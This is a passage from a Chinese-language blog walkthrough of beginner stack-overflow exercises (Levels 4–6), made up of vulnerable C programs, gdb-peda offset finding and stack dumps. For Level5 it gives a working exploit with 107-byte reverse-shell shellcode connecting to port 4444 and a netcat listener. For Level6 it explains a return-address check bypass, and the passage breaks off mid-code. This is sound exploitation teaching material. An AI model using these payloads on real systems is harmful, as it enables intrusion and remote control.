class="line">EDI: 0xf7fa2000 --&gt; 0x1d6d6c </span><br><span class="line">EBP: 0x65414149 (<span class="string">'IAAe'</span>)</span><br><span class="line">ESP: 0xffffd220 (<span class="string">"AJAAfAA5AAKAAgAA6AAL"</span>)</span><br><span class="line">EIP: 0x41344141 (<span class="string">'AA4A'</span>)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41344141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd220 (<span class="string">"AJAAfAA5AAKAAgAA6AAL"</span>)</span><br><span class="line">0004| 0xffffd224 (<span class="string">"fAA5AAKAAgAA6AAL"</span>)</span><br><span class="line">0008| 0xffffd228 (<span class="string">"AAKAAgAA6AAL"</span>)</span><br><span class="line">0012| 0xffffd22c (<span class="string">"AgAA6AAL"</span>)</span><br><span class="line">0016| 0xffffd230 (<span class="string">"6AAL"</span>)</span><br><span class="line">0020| 0xffffd234 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd238 --&gt; 0xf7fa2000 --&gt; 0x1d6d6c </span><br><span class="line">0028| 0xffffd23c --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41344141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern_offset 0x41344141</span><br><span class="line">1093943617 found at offset: 76      <span class="comment">#获得偏移量76</span></span><br></pre></td></tr></table></figure>
+<p>　　然后我们验证一下是否栈的空间大小就是76：<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/9.png" alt=""><br>　　<br>　　石锤了，那就objdump查找win函数的地址，覆写上去就好，payload:<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/10.png" alt="">
+　　</p>
+<h3 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　这个就更简洁了，那我们的目的就是执行一段我们插入的恶意代码了。<br>　　下面进行gdb的调试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 200</span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span></span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /root/Desktop/PwnStudy/Level0-7/level5 </span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd1d0 (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fa25c0 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xf7fa401c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fa2000 --&gt; 0x1d6d6c </span><br><span class="line">EDI: 0xf7fa2000 --&gt; 0x1d6d6c </span><br><span class="line">EBP: 0x65414149 (<span class="string">'IAAe'</span>)</span><br><span class="line">ESP: 0xffffd220 (<span class="string">"AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">EIP: 0x41344141 (<span class="string">'AA4A'</span>)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41344141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd220 (<span class="string">"AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0004| 0xffffd224 (<span class="string">"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0008| 0xffffd228 (<span class="string">"AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0012| 0xffffd22c (<span class="string">"AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0016| 0xffffd230 (<span class="string">"6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0020| 0xffffd234 (<span class="string">"AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0024| 0xffffd238 (<span class="string">"A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0028| 0xffffd23c (<span class="string">"MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41344141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern_offset 0x41344141</span><br><span class="line">1093943617 found at offset: 76          <span class="comment">#溢出大小为76字节</span></span><br><span class="line">gdb-peda$ x/100xw <span class="variable">$esp</span>     <span class="comment">#查看栈内前100个存储单元的内容，以16进制(x)每次4字节(w)的格式打印出来</span></span><br><span class="line">0xffffd220:	0x41414a41	0x35414166	0x414b4141	0x41416741</span><br><span class="line">0xffffd230:	0x4c414136	0x41684141	0x41413741	0x6941414d</span><br><span class="line">0xffffd240:	0x41384141	0x41414e41	0x3941416a	0x414f4141</span><br><span class="line">0xffffd250:	0x41416b41	0x6c414150	0x41514141	0x41416d41</span><br><span class="line">0xffffd260:	0x6f414152	0x41534141	0x41417041	0x71414154</span><br><span class="line">0xffffd270:	0x41554141	0x41417241	0x74414156	0x41574141</span><br><span class="line">0xffffd280:	0x41417541	0x76414158	0x41594141	0x41417741</span><br><span class="line">0xffffd290:	0x7841415a	0x41794141(注意这里)	0xffffd200	0x080483f0</span><br><span class="line">0xffffd2a0:	0x080483e0	0xf7fe42d0	0xffffd2ac	0x0000001c</span><br><span class="line">0xffffd2b0:	0x00000001	0xffffd468	0x00000000	0xffffd48f</span><br><span class="line">0xffffd2c0:	0xffffd4b0	0xffffd4d6	0xffffd524	0xffffd57a</span><br><span class="line">0xffffd2d0:	0xffffd58d	0xffffd5a7	0xffffd5b8	0xffffd5cb</span><br><span class="line">0xffffd2e0:	0xffffd5fc	0xffffd606	0xffffd61c	0xffffd633</span><br><span class="line">0xffffd2f0:	0xffffd63e	0xffffd656	0xffffd66a	0xffffd69d</span><br><span class="line">0xffffd300:	0xffffd6a8	0xffffd6b7	0xffffd6d3	0xffffd710</span><br><span class="line">0xffffd310:	0xffffd71d	0xffffd737	0xffffd74b	0xffffd777</span><br><span class="line">0xffffd320:	0xffffd78f	0xffffd79c	0xffffd7b9	0xffffd7ca</span><br><span class="line">0xffffd330:	0xffffd80c	0xffffd828	0xffffd83d	0xffffd84e</span><br><span class="line">0xffffd340:	0xffffd863	0xffffd872	0xffffd880	0xffffd895</span><br><span class="line">0xffffd350:	0xffffd8a9	0xffffd8cf	0xffffd8f3	0xffffd90a</span><br><span class="line">0xffffd360:	0xffffd91e	0xffffd92f	0xffffd93a	0xffffd942</span><br><span class="line">0xffffd370:	0xffffd969	0xffffd97e	0xffffd989	0xffffd991</span><br><span class="line">0xffffd380:	0xffffd9b1	0xffffdf93	0xffffdfbc	0xffffdfc5</span><br><span class="line">0xffffd390:	0x00000000	0x00000020	0xf7fd3070	0x00000021</span><br><span class="line">0xffffd3a0:	0xf7fd2000	0x00000010	0x1f8bfbff	0x00000006</span><br></pre></td></tr></table></figure></p>
+<p>　　在确定了溢出的大小为76字节后，我们查看一下栈内的内容，(使用x/命令)，可以看到从0xffffd220到0xffffd298都是我们填充的内容，往后都不是了，所以我们可以插入的shellcode的大小为(0xffffd298 - oxffffd220) = 120个字节。这里我去exploit-db上随便找了一个107字节的shellcode，其目的是反弹一个shell到本地的4444端口，下面是payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#输出payload到一个文件</span><br><span class="line">echo `python -c &quot;print &apos;A&apos; * 76 + &apos;\x20\xd2\xff\xff&apos; +&apos;\x31\xc0\x31\xdb\x50\x40\x50\x40\x50\x89\xe1\xb0\x33\x04\x33\x43\xcd\x80\x89\xc6\x31\xc0\x50\xc6\x04\x24\x7f\xc6\x44\x24\x03\x01\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\xb0\x33\x04\x33\x50\x51\x56\x89\xe1\x43\xcd\x80\x31\xd2\x87\xca\xb1\x03\x89\xf3\x31\xc0\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x51\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&apos;&quot;` &gt; test.txt</span><br><span class="line"></span><br><span class="line">#本地开启监听</span><br><span class="line">nc -l -p 4444</span><br><span class="line"></span><br><span class="line">#gdb中将文件作为输入进行读取</span><br><span class="line">gdb-peda$ r &lt; test.txt </span><br><span class="line">Starting program: /root/Desktop/PwnStudy/Level0-7/level5 &lt; test.txt</span><br><span class="line">process 4629 is executing new program: /usr/bin/dash</span><br></pre></td></tr></table></figure></p>
+<p>　　shell反弹之后就可以执行任意命令了：<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/11.png" alt="">
+　　</p>
+<h3 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input path please: "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  ret = __builtin_return_address(<span class="number">0</span>); <span class="comment">//__builtin_return_address(0)的含义是，得到当前函数返回地址</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</span><br><span class="line">    _exit(<span class="number">1</span>); </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  getpath();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　首先进行偏移量的确认和可写入大小的确认：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 300</span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span></span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /root/Desktop/PwnStudy/Level0-7/level6 </span><br><span class="line">input path please: AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%</span><br><span class="line">got path AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x136 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x7ffffeca </span><br><span class="line">EDX: 0xf7fa4010 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fa2000 --&gt; 0x1d6d6c </span><br><span class="line">EDI: 0xf7fa2000 --&gt; 0x1d6d6c </span><br><span class="line">EBP: 0x41344141 (<span class="string">'AA4A'</span>)</span><br><span class="line">ESP: 0xffffd210 (<span class="string">"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA"</span>...)</span><br><span class="line">EIP: 0x41414a41 (<span class="string">'AJAA'</span>)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41414a41</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd210 (<span class="string">"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA"</span>...)</span><br><span class="line">0004| 0xffffd214 (<span class="string">"AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%"</span>...)</span><br><span class="line">0008| 0xffffd218 (<span class="string">"AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%K"</span>...)</span><br><span class="line">0012| 0xffffd21c (<span class="string">"6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA"</span>...)</span><br><span class="line">0016| 0xffffd220 (<span class="string">"AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span>)</span><br><span class="line">0020| 0xffffd224 (<span class="string">"A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span>)</span><br><span class="line">0024| 0xffffd228 (<span class="string">"MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span>)</span><br><span class="line">0028| 0xffffd22c (<span class="string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414a41 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern_offset 0x41414a41</span><br><span class="line">1094797889 found at offset: 80</span><br><span class="line">gdb-peda$ x/200xw <span class="variable">$esp</span></span><br><span class="line">shellcode地址 ---&gt; 0xffffd210:	0x35414166	0x414b4141	0x41416741	0x4c414136</span><br><span class="line">0xffffd220:	0x41684141	0x41413741	0x6941414d	0x41384141</span><br><span class="line">0xffffd230:	0x41414e41	0x3941416a	0x414f4141	0x41416b41</span><br><span class="line">0xffffd240:	0x6c414150	0x41514141	0x41416d41	0x6f414152</span><br><span class="line">0xffffd250:	0x41534141	0x41417041	0x71414154	0x41554141</span><br><span class="line">0xffffd260:	0x41417241	0x74414156	0x41574141	0x41417541</span><br><span class="line">0xffffd270:	0x76414158	0x41594141	0x41417741	0x7841415a</span><br><span class="line">0xffffd280:	0x41794141	0x25417a41	0x73254125	0x41422541</span><br><span class="line">0xffffd290:	0x25412425	0x4325416e	0x412d2541	0x25412825</span><br><span class="line">0xffffd2a0:	0x3b254144	0x41292541	0x25414525	0x30254161</span><br><span class="line">0xffffd2b0:	0x41462541	0x25416225	0x47254131	0x41632541</span><br><span class="line">0xffffd2c0:	0x25413225	0x64254148	0x41332541	0x25414925</span><br><span class="line">0xffffd2d0:	0x34254165	0x414a2541	0x25416625	0x4b254135</span><br><span class="line">0xffffd2e0:	0x41672541	0x25413625(到这里)	0xffffd600	0xffffd633</span><br><span class="line">0xffffd2f0:	0xffffd63e	0xffffd656	0xffffd66a	0xffffd69d</span><br><span class="line">0xffffd300:	0xffffd6a8	0xffffd6b7	0xffffd6d3	0xffffd710</span><br><span class="line">0xffffd310:	0xffffd71d	0xffffd737	0xffffd74b	0xffffd777</span><br><span class="line">0xffffd320:	0xffffd78f	0xffffd79c	0xffffd7b9	0xffffd7ca</span><br><span class="line">0xffffd330:	0xffffd80c	0xffffd828	0xffffd83d	0xffffd84e</span><br><span class="line">0xffffd340:	0xffffd863	0xffffd872	0xffffd880	0xffffd895</span><br><span class="line">0xffffd350:	0xffffd8a9	0xffffd8cf	0xffffd8f3	0xffffd90a</span><br><span class="line">0xffffd360:	0xffffd91e	0xffffd92f	0xffffd93a	0xffffd942</span><br><span class="line">0xffffd370:	0xffffd969	0xffffd97e	0xffffd989	0xffffd991</span><br><span class="line">0xffffd380:	0xffffd9b1	0xffffdf93	0xffffdfbc	0xffffdfc5</span><br></pre></td></tr></table></figure></p>
+<p>　　结论：偏移量是80字节，可控大小为200字节。这道题主要就是防止eip转到栈上去执行shell，主要是绕过0xbf000000这个检测（linux下的栈都是0xbf开头)。解决的方法是我们可以使用getpath()函数的ret指令来覆盖main函数的返回地址，当弹出ret到eip时，会执行ret指令(ret的地址是0x08开头,可以绕过上面的限制)，再弹出栈头的数据到eip,这时如果栈头是shellcode的地址，那么就溢出成功了。<br>　　<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 